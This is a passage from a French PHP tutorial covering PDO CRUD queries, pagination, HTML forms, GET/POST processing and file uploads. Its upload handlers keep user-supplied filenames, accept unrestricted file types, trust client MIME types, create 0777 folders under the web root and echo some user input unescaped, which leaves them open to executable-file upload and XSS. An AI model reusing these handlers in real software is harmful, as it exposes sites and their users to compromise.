        echo "❌ Erreur : " . $e->getMessage();
    }
}

// Utilisation
$nouveauxEtudiants = [
    ['nom' => 'Petit', 'prenom' => 'Alexandre', 'email' => 'alex.petit@email.com', 'age' => 20, 'ville' => 'Nice'],
    ['nom' => 'Grand', 'prenom' => 'Camille', 'email' => 'camille.grand@email.com', 'age' => 22, 'ville' => 'Toulouse']
];

ajouterPlusieursEtudiants($pdo, $nouveauxEtudiants);
?></code></pre>

    <h3>12.3 UPDATE - Modifier des données</h3>
    
    <p><code>UPDATE</code> permet de modifier des enregistrements existants. C'est comme corriger des informations sur un formulaire déjà rempli.</p>

    <h4>Syntaxe de base :</h4>
    <pre><code>UPDATE table SET colonne1 = valeur1, colonne2 = valeur2 WHERE condition;</code></pre>

    <div style="background: #ffebee; border: 1px solid #f44336; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <strong>⚠️ ATTENTION :</strong> Toujours mettre une condition WHERE, sinon TOUS les enregistrements seront modifiés !
    </div>

    <h4>Exemples sécurisés :</h4>
    <pre><code><?php
// Modifier l'âge d'un étudiant spécifique
function modifierAge($pdo, $id, $nouvelAge) {
    $sql = "UPDATE etudiants SET age = :age WHERE id = :id";
    
    try {
        $stmt = $pdo->prepare($sql);
        $stmt->execute([
            ':age' => $nouvelAge,
            ':id' => $id
        ]);
        
        $nbModifies = $stmt->rowCount();
        if ($nbModifies > 0) {
            echo "✅ Âge modifié pour $nbModifies étudiant(s)";
        } else {
            echo "⚠️ Aucun étudiant trouvé avec cet ID";
        }
        
    } catch (PDOException $e) {
        echo "❌ Erreur : " . $e->getMessage();
    }
}

// Modifier plusieurs champs à la fois
function modifierEtudiant($pdo, $id, $donnees) {
    $sql = "UPDATE etudiants SET nom = :nom, prenom = :prenom, email = :email, 
            age = :age, ville = :ville WHERE id = :id";
    
    try {
        $stmt = $pdo->prepare($sql);
        $donnees[':id'] = $id; // Ajouter l'ID aux données
        $stmt->execute($donnees);
        
        echo "✅ Étudiant modifié !";
        
    } catch (PDOException $e) {
        echo "❌ Erreur : " . $e->getMessage();
    }
}

// Utilisation
$pdo = connecterDB();
modifierAge($pdo, 1, 26);

$nouvellesDonnees = [
    ':nom' => 'Dupont-Martin',
    ':prenom' => 'Jean-Pierre', 
    ':email' => 'jp.dupont@email.com',
    ':age' => 26,
    ':ville' => 'Paris'
];
modifierEtudiant($pdo, 1, $nouvellesDonnees);
?></code></pre>

    <h4>Modifications conditionnelles :</h4>
    <pre><code><?php
// Augmenter l'âge de tous les étudiants de Paris
$sql = "UPDATE etudiants SET age = age + 1 WHERE ville = 'Paris'";
$stmt = $pdo->prepare($sql);
$stmt->execute();
echo "Âge augmenté pour " . $stmt->rowCount() . " étudiants parisiens";

// Changer la ville de tous les étudiants de moins de 20 ans
$sql = "UPDATE etudiants SET ville = 'Campus Junior' WHERE age < 20";
$stmt = $pdo->prepare($sql);
$stmt->execute();
echo "Ville changée pour " . $stmt->rowCount() . " jeunes étudiants";
?></code></pre>

    <h3>12.4 DELETE - Supprimer des données</h3>
    
    <p><code>DELETE</code> supprime définitivement des enregistrements. C'est irréversible, alors soyez très prudents !</p>

    <h4>Syntaxe de base :</h4>
    <pre><code>DELETE FROM table WHERE condition;</code></pre>

    <div style="background: #ffebee; border: 1px solid #f44336; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <strong>🚨 DANGER :</strong> <code>DELETE FROM table</code> sans WHERE supprime TOUT ! Toujours vérifier votre requête !
    </div>

    <h4>Suppressions sécurisées :</h4>
    <pre><code><?php
// Supprimer un étudiant par son ID
function supprimerEtudiant($pdo, $id) {
    // D'abord, vérifier que l'étudiant existe
    $sql = "SELECT nom, prenom FROM etudiants WHERE id = :id";
    $stmt = $pdo->prepare($sql);
    $stmt->execute([':id' => $id]);
    $etudiant = $stmt->fetch();
    
    if (!$etudiant) {
        echo "⚠️ Aucun étudiant trouvé avec l'ID $id";
        return false;
    }
    
    // Confirmation avant suppression
    echo "🤔 Êtes-vous sûr de vouloir supprimer {$etudiant['prenom']} {$etudiant['nom']} ?<br>";
    
    // Suppression effective
    $sql = "DELETE FROM etudiants WHERE id = :id";
    try {
        $stmt = $pdo->prepare($sql);
        $stmt->execute([':id' => $id]);
        
        if ($stmt->rowCount() > 0) {
            echo "✅ Étudiant supprimé avec succès";
        }
        
    } catch (PDOException $e) {
        echo "❌ Erreur : " . $e->getMessage();
    }
}

// Supprimer avec conditions multiples
function nettoyerAnciennesInscriptions($pdo) {
    $sql = "DELETE FROM etudiants 
            WHERE date_inscription < DATE_SUB(NOW(), INTERVAL 5 YEAR)";
    
    try {
        $stmt = $pdo->prepare($sql);
        $stmt->execute();
        
        $nbSupprimes = $stmt->rowCount();
        echo "🧹 $nbSupprimes anciennes inscriptions supprimées";
        
    } catch (PDOException $e) {
        echo "❌ Erreur : " . $e->getMessage();
    }
}
?></code></pre>

    <h3>12.5 Requêtes avancées et bonnes pratiques</h3>
    
    <h4>Comptages et agrégations :</h4>
    <pre><code><?php
// Compter par ville
$sql = "SELECT ville, COUNT(*) as nombre 
        FROM etudiants 
        GROUP BY ville 
        ORDER BY nombre DESC";
$resultat = $pdo->query($sql);

echo "<h4>Étudiants par ville :</h4>";
while ($ligne = $resultat->fetch()) {
    echo $ligne['ville'] . " : " . $ligne['nombre'] . " étudiant(s)<br>";
}

// Statistiques sur l'âge
$sql = "SELECT 
            COUNT(*) as total,
            AVG(age) as age_moyen,
            MIN(age) as plus_jeune,
            MAX(age) as plus_age
        FROM etudiants";
$stats = $pdo->query($sql)->fetch();

echo "<h4>Statistiques :</h4>";
echo "Total : " . $stats['total'] . "<br>";
echo "Âge moyen : " . round($stats['age_moyen'], 1) . " ans<br>";
echo "Plus jeune : " . $stats['plus_jeune'] . " ans<br>";
echo "Plus âgé : " . $stats['plus_age'] . " ans<br>";
?></code></pre>

    <h4>Recherche et pagination :</h4>
    <pre><code><?php
function rechercherEtudiants($pdo, $terme, $page = 1, $parPage = 5) {
    $offset = ($page - 1) * $parPage;
    
    $sql = "SELECT * FROM etudiants 
            WHERE nom LIKE :terme OR prenom LIKE :terme OR email LIKE :terme
            ORDER BY nom, prenom
            LIMIT :limit OFFSET :offset";
    
    try {
        $stmt = $pdo->prepare($sql);
        $stmt->bindValue(':terme', "%$terme%", PDO::PARAM_STR);
        $stmt->bindValue(':limit', $parPage, PDO::PARAM_INT);
        $stmt->bindValue(':offset', $offset, PDO::PARAM_INT);
        $stmt->execute();
        
        $resultats = $stmt->fetchAll();
        
        // Compter le total pour la pagination
        $sqlCount = "SELECT COUNT(*) FROM etudiants 
                     WHERE nom LIKE :terme OR prenom LIKE :terme OR email LIKE :terme";
        $stmtCount = $pdo->prepare($sqlCount);
        $stmtCount->execute([':terme' => "%$terme%"]);
        $total = $stmtCount->fetchColumn();
        
        return [
            'resultats' => $resultats,
            'total' => $total,
            'page' => $page,
            'totalPages' => ceil($total / $parPage)
        ];
        
    } catch (PDOException $e) {
        echo "❌ Erreur de recherche : " . $e->getMessage();
        return false;
    }
}

// Utilisation
$recherche = rechercherEtudiants($pdo, "martin", 1, 3);
if ($recherche) {
    echo "<h4>Résultats pour 'martin' :</h4>";
    foreach ($recherche['resultats'] as $etudiant) {
        echo $etudiant['prenom'] . " " . $etudiant['nom'] . "<br>";
    }
    echo "<p>Page {$recherche['page']} sur {$recherche['totalPages']}</p>";
}
?></code></pre>

    <h3>12.6 Exercice pratique : CRUD complet</h3>
    
    <p><strong>Objectif :</strong> Créer un système CRUD (Create, Read, Update, Delete) complet pour gérer des produits.</p>
    
    <p><strong>Créez ces fonctions :</strong></p>
    <ol>
        <li><code>ajouterProduit($nom, $prix, $stock, $categorie)</code></li>
        <li><code>listerProduits($categorie = null)</code></li>
        <li><code>obtenirProduit($id)</code></li>
        <li><code>modifierProduit($id, $donnees)</code></li>
        <li><code>supprimerProduit($id)</code></li>
        <li><code>rechercherProduits($terme)</code></li>
        <li><code>statistiquesProduits()</code></li>
    </ol>

    <p><strong>Testez toutes les fonctions avec des données réelles.</strong></p>

    <details>
        <summary><strong>💡 Voir la solution</strong></summary>
        <pre><code><?php
require_once 'config.php';

class GestionnaireProduits {
    private $pdo;
    
    public function __construct() {
        $this->pdo = connecterDB();
    }
    
    public function ajouterProduit($nom, $prix, $stock, $categorie) {
        $sql = "INSERT INTO produits (nom, prix, stock, categorie) 
                VALUES (:nom, :prix, :stock, :categorie)";
        
        try {
            $stmt = $this->pdo->prepare($sql);
            $stmt->execute([
                ':nom' => $nom,
                ':prix' => $prix,
                ':stock' => $stock,
                ':categorie' => $categorie
            ]);
            
            echo "✅ Produit ajouté ! ID : " . $this->pdo->lastInsertId() . "<br>";
            return $this->pdo->lastInsertId();
            
        } catch (PDOException $e) {
            echo "❌ Erreur : " . $e->getMessage() . "<br>";
            return false;
        }
    }
    
    public function listerProduits($categorie = null) {
        if ($categorie) {
            $sql = "SELECT * FROM produits WHERE categorie = :categorie ORDER BY nom";
            $stmt = $this->pdo->prepare($sql);
            $stmt->execute([':categorie' => $categorie]);
        } else {
            $sql = "SELECT * FROM produits ORDER BY nom";
            $stmt = $this->pdo->query($sql);
        }
        
        return $stmt->fetchAll();
    }
    
    public function obtenirProduit($id) {
        $sql = "SELECT * FROM produits WHERE id = :id";
        $stmt = $this->pdo->prepare($sql);
        $stmt->execute([':id' => $id]);
        
        return $stmt->fetch();
    }
    
    public function modifierProduit($id, $donnees) {
        $sql = "UPDATE produits SET nom = :nom, prix = :prix, 
                stock = :stock, categorie = :categorie WHERE id = :id";
        
        try {
            $stmt = $this->pdo->prepare($sql);
            $donnees[':id'] = $id;
            $stmt->execute($donnees);
            
            if ($stmt->rowCount() > 0) {
                echo "✅ Produit modifié !<br>";
                return true;
            } else {
                echo "⚠️ Aucun produit trouvé avec cet ID<br>";
                return false;
            }
            
        } catch (PDOException $e) {
            echo "❌ Erreur : " . $e->getMessage() . "<br>";
            return false;
        }
    }
    
    public function supprimerProduit($id) {
        // Vérifier que le produit existe
        $produit = $this->obtenirProduit($id);
        if (!$produit) {
            echo "⚠️ Produit non trouvé<br>";
            return false;
        }
        
        $sql = "DELETE FROM produits WHERE id = :id";
        try {
            $stmt = $this->pdo->prepare($sql);
            $stmt->execute([':id' => $id]);
            
            echo "✅ Produit '{$produit['nom']}' supprimé<br>";
            return true;
            
        } catch (PDOException $e) {
            echo "❌ Erreur : " . $e->getMessage() . "<br>";
            return false;
        }
    }
    
    public function rechercherProduits($terme) {
        $sql = "SELECT * FROM produits 
                WHERE nom LIKE :terme OR description LIKE :terme
                ORDER BY nom";
        
        $stmt = $this->pdo->prepare($sql);
        $stmt->execute([':terme' => "%$terme%"]);
        
        return $stmt->fetchAll();
    }
    
    public function statistiquesProduits() {
        $sql = "SELECT 
                    COUNT(*) as total_produits,
                    SUM(stock) as stock_total,
                    AVG(prix) as prix_moyen,
                    categorie,
                    COUNT(*) as nb_par_categorie
                FROM produits 
                GROUP BY categorie";
        
        $stats = $this->pdo->query($sql)->fetchAll();
        
        echo "<h4>📊 Statistiques des produits :</h4>";
        foreach ($stats as $stat) {
            echo "Catégorie {$stat['categorie']} : {$stat['nb_par_categorie']} produits<br>";
        }
        
        return $stats;
    }
}

// Tests
$gestion = new GestionnaireProduits();

// Test ajout
$gestion->ajouterProduit("MacBook Pro", 2499.99, 5, "electronique");
$gestion->ajouterProduit("iPhone 15", 1199.99, 10, "electronique");

// Test listing
echo "<h4>📋 Tous les produits :</h4>";
$produits = $gestion->listerProduits();
foreach ($produits as $produit) {
    echo $produit['nom'] . " - " . $produit['prix'] . "€ (Stock: {$produit['stock']})<br>";
}

// Test recherche
echo "<h4>🔍 Recherche 'phone' :</h4>";
$resultats = $gestion->rechercherProduits("phone");
foreach ($resultats as $produit) {
    echo $produit['nom'] . "<br>";
}

// Test modification
$gestion->modifierProduit(1, [
    ':nom' => 'MacBook Pro M3',
    ':prix' => 2299.99,
    ':stock' => 3,
    ':categorie' => 'electronique'
]);

// Statistiques
$gestion->statistiquesProduits();
?></code></pre>
    </details>
</section>

<!-- Partie 13: Formulaires HTML et traitement en PHP -->
<section class="part13">
    <h2>13. Formulaires HTML et traitement en PHP</h2>
    
    <p>Les formulaires sont le <strong>pont</strong> entre vos visiteurs et votre site web ! C'est grâce à eux que les utilisateurs peuvent s'inscrire, se connecter, commander des produits, laisser des commentaires... Sans formulaires, votre site serait comme un musée : beau à regarder, mais pas d'interaction !</p>

    <p>PHP est le <strong>réceptionniste</strong> qui traite toutes les informations envoyées par les formulaires HTML.</p>

    <h3>13.1 Rappel des formulaires HTML</h3>
    
    <p>Avant de traiter les données en PHP, rappelons-nous comment créer un formulaire HTML correct.</p>

    <h4>Structure de base d'un formulaire :</h4>
    <pre><code>&lt;form method="POST" action="traitement.php"&gt;
    &lt;!-- Champs du formulaire --&gt;
    &lt;input type="submit" value="Envoyer"&gt;
&lt;/form&gt;</code></pre>

    <h4>Exemple complet : Formulaire d'inscription</h4>
    <pre><code>&lt;!-- inscription.html --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Inscription&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h2&gt;📝 Formulaire d'inscription&lt;/h2&gt;
    
    &lt;form method="POST" action="traiter_inscription.php"&gt;
        &lt;div&gt;
            &lt;label for="nom"&gt;Nom :&lt;/label&gt;
            &lt;input type="text" id="nom" name="nom" required&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label for="email"&gt;Email :&lt;/label&gt;
            &lt;input type="email" id="email" name="email" required&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label for="age"&gt;Âge :&lt;/label&gt;
            &lt;input type="number" id="age" name="age" min="13" max="120"&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label for="ville"&gt;Ville :&lt;/label&gt;
            &lt;select id="ville" name="ville"&gt;
                &lt;option value=""&gt;Choisissez...&lt;/option&gt;
                &lt;option value="paris"&gt;Paris&lt;/option&gt;
                &lt;option value="lyon"&gt;Lyon&lt;/option&gt;
                &lt;option value="marseille"&gt;Marseille&lt;/option&gt;
            &lt;/select&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label&gt;Centres d'intérêt :&lt;/label&gt;
            &lt;input type="checkbox" id="sport" name="interets[]" value="sport"&gt;
            &lt;label for="sport"&gt;Sport&lt;/label&gt;
            
            &lt;input type="checkbox" id="musique" name="interets[]" value="musique"&gt;
            &lt;label for="musique"&gt;Musique&lt;/label&gt;
            
            &lt;input type="checkbox" id="lecture" name="interets[]" value="lecture"&gt;
            &lt;label for="lecture"&gt;Lecture&lt;/label&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label for="commentaire"&gt;Commentaire :&lt;/label&gt;
            &lt;textarea id="commentaire" name="commentaire" rows="4"&gt;&lt;/textarea&gt;
        &lt;/div&gt;
        
        &lt;button type="submit"&gt;S'inscrire&lt;/button&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>

    <h3>13.2 GET vs POST : Quelle méthode choisir ?</h3>
    
    <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <h4>📮 Méthode POST :</h4>
        <p><strong>Utiliser pour :</strong> Envoi de données sensibles, inscription, connexion, commandes...</p>
        <ul>
            <li>✅ Les données ne sont <strong>pas visibles</strong> dans l'URL</li>
            <li>✅ Peut envoyer <strong>beaucoup de données</strong></li>
            <li>✅ Plus <strong>sécurisé</strong> pour les mots de passe</li>
            <li>✅ Peut envoyer des <strong>fichiers</strong></li>
        </ul>

        <h4>🔗 Méthode GET :</h4>
        <p><strong>Utiliser pour :</strong> Recherches, filtres, liens partageables...</p>
        <ul>
            <li>✅ Les données sont <strong>visibles</strong> dans l'URL</li>
            <li>✅ Peut être <strong>mise en favoris</strong></li>
            <li>❌ Limité en <strong>taille</strong> (environ 2000 caractères)</li>
            <li>❌ <strong>Pas sécurisé</strong> pour les données sensibles</li>
        </ul>
    </div>

    <h4>Exemples d'URLs avec GET :</h4>
    <pre><code>// Recherche de produits
https://monsite.com/recherche.php?terme=smartphone&amp;prix_max=500

// Pagination
https://monsite.com/articles.php?page=2&amp;categorie=tech</code></pre>

    <h3>13.3 Traitement des données POST</h3>
    
    <p>Quand un formulaire est envoyé en POST, PHP reçoit les données dans la variable spéciale <code>$_POST</code>.</p>

    <h4>Fichier traiter_inscription.php :</h4>
    <pre><code>&lt;?php
// Vérifier que le formulaire a été envoyé
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // Récupérer les données envoyées
    $nom = $_POST['nom'] ?? '';
    $email = $_POST['email'] ?? '';
    $age = $_POST['age'] ?? '';
    $ville = $_POST['ville'] ?? '';
    $interets = $_POST['interets'] ?? [];
    $commentaire = $_POST['commentaire'] ?? '';
    
    // Afficher les données reçues
    echo "&lt;h2&gt;✅ Inscription reçue !&lt;/h2&gt;";
    echo "&lt;p&gt;&lt;strong&gt;Nom :&lt;/strong&gt; " . htmlspecialchars($nom) . "&lt;/p&gt;";
    echo "&lt;p&gt;&lt;strong&gt;Email :&lt;/strong&gt; " . htmlspecialchars($email) . "&lt;/p&gt;";
    echo "&lt;p&gt;&lt;strong&gt;Âge :&lt;/strong&gt; " . $age . " ans&lt;/p&gt;";
    echo "&lt;p&gt;&lt;strong&gt;Ville :&lt;/strong&gt; " . htmlspecialchars($ville) . "&lt;/p&gt;";
    
    // Traitement des cases à cocher (tableau)
    if (!empty($interets)) {
        echo "&lt;p&gt;&lt;strong&gt;Centres d'intérêt :&lt;/strong&gt; " . implode(", ", $interets) . "&lt;/p&gt;";
    }
    
    if (!empty($commentaire)) {
        echo "&lt;p&gt;&lt;strong&gt;Commentaire :&lt;/strong&gt;&lt;br&gt;" . nl2br(htmlspecialchars($commentaire)) . "&lt;/p&gt;";
    }
    
} else {
    echo "&lt;p&gt;❌ Aucune donnée reçue.&lt;/p&gt;";
}
?&gt;</code></pre>

    <div style="background: #fff3cd; border: 1px solid #ffc107; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <strong>🛡️ Sécurité :</strong> Notez l'utilisation de <code>htmlspecialchars()</code> pour éviter les attaques XSS !
    </div>

    <h3>13.4 Traitement des données GET</h3>
    
    <h4>Formulaire de recherche (GET) :</h4>
    <pre><code>&lt;!-- recherche.html --&gt;
&lt;form method="GET" action="resultats.php"&gt;
    &lt;input type="text" name="q" placeholder="Rechercher..."&gt;
    
    &lt;select name="categorie"&gt;
        &lt;option value=""&gt;Toutes catégories&lt;/option&gt;
        &lt;option value="electronique"&gt;Électronique&lt;/option&gt;
        &lt;option value="vetement"&gt;Vêtements&lt;/option&gt;
        &lt;option value="livre"&gt;Livres&lt;/option&gt;
    &lt;/select&gt;
    
    &lt;input type="number" name="prix_max" placeholder="Prix max"&gt;
    
    &lt;button type="submit"&gt;🔍 Rechercher&lt;/button&gt;
&lt;/form&gt;</code></pre>

    <h4>Traitement de la recherche :</h4>
    <pre><code>&lt;?php
// resultats.php
$terme = $_GET['q'] ?? '';
$categorie = $_GET['categorie'] ?? '';
$prixMax = $_GET['prix_max'] ?? '';

echo "&lt;h2&gt;🔍 Résultats de recherche&lt;/h2&gt;";

if (!empty($terme)) {
    echo "&lt;p&gt;Recherche pour : &lt;strong&gt;" . htmlspecialchars($terme) . "&lt;/strong&gt;&lt;/p&gt;";
}

if (!empty($categorie)) {
    echo "&lt;p&gt;Catégorie : &lt;strong&gt;" . htmlspecialchars($categorie) . "&lt;/strong&gt;&lt;/p&gt;";
}

if (!empty($prixMax)) {
    echo "&lt;p&gt;Prix maximum : &lt;strong&gt;" . $prixMax . "€&lt;/strong&gt;&lt;/p&gt;";
}

// Ici, vous feriez une vraie recherche en base de données
// En utilisant les paramètres reçus
?&gt;</code></pre>

    <h3>13.5 Upload de fichiers</h3>
    
    <p>PHP peut aussi recevoir des fichiers envoyés par les utilisateurs (photos, documents, etc.).</p>

    <h4>Formulaire d'upload :</h4>
    <pre><code>&lt;!-- IMPORTANT : enctype="multipart/form-data" pour les fichiers ! --&gt;
&lt;form method="POST" action="upload.php" enctype="multipart/form-data"&gt;
    &lt;div&gt;
        &lt;label for="nom"&gt;Votre nom :&lt;/label&gt;
        &lt;input type="text" id="nom" name="nom" required&gt;
    &lt;/div&gt;
    
    &lt;div&gt;
        &lt;label for="photo"&gt;Photo de profil :&lt;/label&gt;
        &lt;input type="file" id="photo" name="photo" accept="image/*"&gt;
    &lt;/div&gt;
    
    &lt;div&gt;
        &lt;label for="cv"&gt;CV (PDF) :&lt;/label&gt;
        &lt;input type="file" id="cv" name="cv" accept=".pdf"&gt;
    &lt;/div&gt;
    
    &lt;button type="submit"&gt;📤 Envoyer&lt;/button&gt;
&lt;/form&gt;</code></pre>

    <h4>Traitement de l'upload :</h4>
    <pre><code>&lt;?php
// upload.php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $nom = $_POST['nom'] ?? '';
    
    echo "&lt;h2&gt;📤 Upload pour : " . htmlspecialchars($nom) . "&lt;/h2&gt;";
    
    // Traitement de la photo
    if (isset($_FILES['photo']) && $_FILES['photo']['error'] === UPLOAD_ERR_OK) {
        $photo = $_FILES['photo'];
        
        echo "&lt;h3&gt;📸 Photo reçue :&lt;/h3&gt;";
        echo "&lt;p&gt;Nom : " . $photo['name'] . "&lt;/p&gt;";
        echo "&lt;p&gt;Taille : " . number_format($photo['size'] / 1024, 2) . " Ko&lt;/p&gt;";
        echo "&lt;p&gt;Type : " . $photo['type'] . "&lt;/p&gt;";
        
        // Définir où sauvegarder le fichier
        $dossierUpload = 'uploads/photos/';
        if (!is_dir($dossierUpload)) {
            mkdir($dossierUpload, 0777, true);
        }
        
        // Générer un nom unique pour éviter les conflits
        $nomFichier = uniqid() . '_' . $photo['name'];
        $cheminComplet = $dossierUpload . $nomFichier;
        
        // Déplacer le fichier temporaire vers sa destination finale
        if (move_uploaded_file($photo['tmp_name'], $cheminComplet)) {
            echo "&lt;p&gt;✅ Photo sauvegardée avec succès !&lt;/p&gt;";
            echo "&lt;img src='$cheminComplet' style='max-width: 200px;'&gt;";
        } else {
            echo "&lt;p&gt;❌ Erreur lors de la sauvegarde de la photo.&lt;/p&gt;";
        }
    }
    
    // Traitement du CV
    if (isset($_FILES['cv']) && $_FILES['cv']['error'] === UPLOAD_ERR_OK) {
        $cv = $_FILES['cv'];
        
        echo "&lt;h3&gt;📄 CV reçu :&lt;/h3&gt;";
        echo "&lt;p&gt;Nom : " . $cv['name'] . "&lt;/p&gt;";
        echo "&lt;p&gt;Taille : " . number_format($cv['size'] / 1024, 2) . " Ko&lt;/p&gt;";
        
        // Vérifier que c'est bien un PDF
        if ($cv['type'] === 'application/pdf') {
            $dossierCV = 'uploads/cv/';
            if (!is_dir($dossierCV)) {
                mkdir($dossierCV, 0777, true);
            }
            
            $nomCV = uniqid() . '_' . $cv['name'];
            $cheminCV = $dossierCV . $nomCV;
            
            if (move_uploaded_file($cv['tmp_name'], $cheminCV)) {
                echo "&lt;p&gt;✅ CV sauvegardé avec succès !&lt;/p&gt;";
            } else {
                echo "&lt;p&gt;❌ Erreur lors de la sauvegarde du CV.&lt;/p&gt;";
            }
        } else {
            echo "&lt;p&gt;❌ Le fichier doit être un PDF.&lt;/p&gt;";
        }
    }
}
?&gt;</code></pre>

    <h3>13.6 Formulaire avec pré-remplissage</h3>
    
    <p>Parfois, on veut modifier des données existantes. Il faut alors pré-remplir le formulaire.</p>

    <pre><code>&lt;?php
// modifier_profil.php
// Supposons qu'on récupère les données depuis la base
$utilisateur = [
    'nom' => 'Dupont',
    'email' => 'dupont@email.com',
    'age' => 25,
    'ville' => 'paris',
    'interets' => ['sport', 'lecture']
];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Traitement de la modification
    echo "&lt;div style='background: #d4edda; padding: 10px; border-radius: 5px;'&gt;";
    echo "✅ Profil mis à jour avec succès !";
    echo "&lt;/div&gt;";
    
    // Mettre à jour les données pour le pré-remplissage
    $utilisateur['nom'] = $_POST['nom'] ?? $utilisateur['nom'];
    $utilisateur['email'] = $_POST['email'] ?? $utilisateur['email'];
    // etc...
}
?&gt;

&lt;h2&gt;✏️ Modifier mon profil&lt;/h2&gt;

&lt;form method="POST"&gt;
    &lt;div&gt;
        &lt;label for="nom"&gt;Nom :&lt;/label&gt;
        &lt;input type="text" id="nom" name="nom" 
               value="&lt;?= htmlspecialchars($utilisateur['nom']) ?&gt;" required&gt;
    &lt;/div&gt;
    
    &lt;div&gt;
        &lt;label for="email"&gt;Email :&lt;/label&gt;
        &lt;input type="email" id="email" name="email" 
               value="&lt;?= htmlspecialchars($utilisateur['email']) ?&gt;" required&gt;
    &lt;/div&gt;
    
    &lt;div&gt;
        &lt;label for="ville"&gt;Ville :&lt;/label&gt;
        &lt;select id="ville" name="ville"&gt;
            &lt;option value="paris" &lt;?= $utilisateur['ville'] === 'paris' ? 'selected' : '' ?&gt;&gt;Paris&lt;/option&gt;
            &lt;option value="lyon" &lt;?= $utilisateur['ville'] === 'lyon' ? 'selected' : '' ?&gt;&gt;Lyon&lt;/option&gt;
            &lt;option value="marseille" &lt;?= $utilisateur['ville'] === 'marseille' ? 'selected' : '' ?&gt;&gt;Marseille&lt;/option&gt;
        &lt;/select&gt;
    &lt;/div&gt;
    
    &lt;div&gt;
        &lt;label&gt;Centres d'intérêt :&lt;/label&gt;
        &lt;input type="checkbox" id="sport" name="interets[]" value="sport"
               &lt;?= in_array('sport', $utilisateur['interets']) ? 'checked' : '' ?&gt;&gt;
        &lt;label for="sport"&gt;Sport&lt;/label&gt;
        
        &lt;input type="checkbox" id="lecture" name="interets[]" value="lecture"
               &lt;?= in_array('lecture', $utilisateur['interets']) ? 'checked' : '' ?&gt;&gt;
        &lt;label for="lecture"&gt;Lecture&lt;/label&gt;
    &lt;/div&gt;
    
    &lt;button type="submit"&gt;💾 Sauvegarder&lt;/button&gt;
&lt;/form&gt;</code></pre>

    <h3>13.7 Exercice pratique : Système de contact</h3>
    
    <p><strong>Objectif :</strong> Créer un formulaire de contact complet avec sauvegarde en base de données.</p>
    
    <p><strong>Créez :</strong></p>
    <ol>
        <li>Un formulaire HTML avec : nom, email, sujet, message, fichier joint (optionnel)</li>
        <li>Une page de traitement PHP qui :
            <ul>
                <li>Vérifie que tous les champs obligatoires sont remplis</li>
                <li>Sauvegarde le message en base de données</li>
                <li>Gère l'upload du fichier joint</li>
                <li>Affiche un message de confirmation</li>
            </ul>
        </li>
        <li>Une page d'administration pour voir tous les messages reçus</li>
    </ol>

    <details>
        <summary><strong>💡 Voir la solution</strong></summary>
        <pre><code>&lt;!-- contact.html --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Contact&lt;/title&gt;
    &lt;style&gt;
        form { max-width: 500px; margin: 20px auto; }
        div { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input, select, textarea { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; }
        button { background: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;📧 Nous contacter&lt;/h1&gt;
    
    &lt;form method="POST" action="traiter_contact.php" enctype="multipart/form-data"&gt;
        &lt;div&gt;
            &lt;label for="nom"&gt;Nom complet * :&lt;/label&gt;
            &lt;input type="text" id="nom" name="nom" required&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label for="email"&gt;Email * :&lt;/label&gt;
            &lt;input type="email" id="email" name="email" required&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label for="sujet"&gt;Sujet * :&lt;/label&gt;
            &lt;select id="sujet" name="sujet" required&gt;
                &lt;option value=""&gt;Choisissez un sujet...&lt;/option&gt;
                &lt;option value="info"&gt;Demande d'information&lt;/option&gt;
                &lt;option value="support"&gt;Support technique&lt;/option&gt;
                &lt;option value="bug"&gt;Signaler un bug&lt;/option&gt;
                &lt;option value="autre"&gt;Autre&lt;/option&gt;
            &lt;/select&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label for="message"&gt;Message * :&lt;/label&gt;
            &lt;textarea id="message" name="message" rows="6" required&gt;&lt;/textarea&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label for="fichier"&gt;Fichier joint (optionnel) :&lt;/label&gt;
            &lt;input type="file" id="fichier" name="fichier"&gt;
        &lt;/div&gt;
        
        &lt;button type="submit"&gt;📤 Envoyer le message&lt;/button&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;

&lt;?php
// traiter_contact.php
require_once 'config.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $nom = trim($_POST['nom'] ?? '');
    $email = trim($_POST['email'] ?? '');
    $sujet = $_POST['sujet'] ?? '';
    $message = trim($_POST['message'] ?? '');
    
    $erreurs = [];
    
    // Validation
    if (empty($nom)) $erreurs[] = "Le nom est obligatoire";
    if (empty($email)) $erreurs[] = "L'email est obligatoire";
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) $erreurs[] = "Email invalide";
    if (empty($sujet)) $erreurs[] = "Le sujet est obligatoire";
    if (empty($message)) $erreurs[] = "Le message est obligatoire";
    
    if (empty($erreurs)) {
        try {
            $pdo = connecterDB();
            
            // Traitement du fichier joint
            $nomFichier = null;
            if (isset($_FILES['fichier']) && $_FILES['fichier']['error'] === UPLOAD_ERR_OK) {
                $dossier = 'uploads/contact/';
                if (!is_dir($dossier)) mkdir($dossier, 0777, true);
                
                $nomFichier = uniqid() . '_' . $_FILES['fichier']['name'];
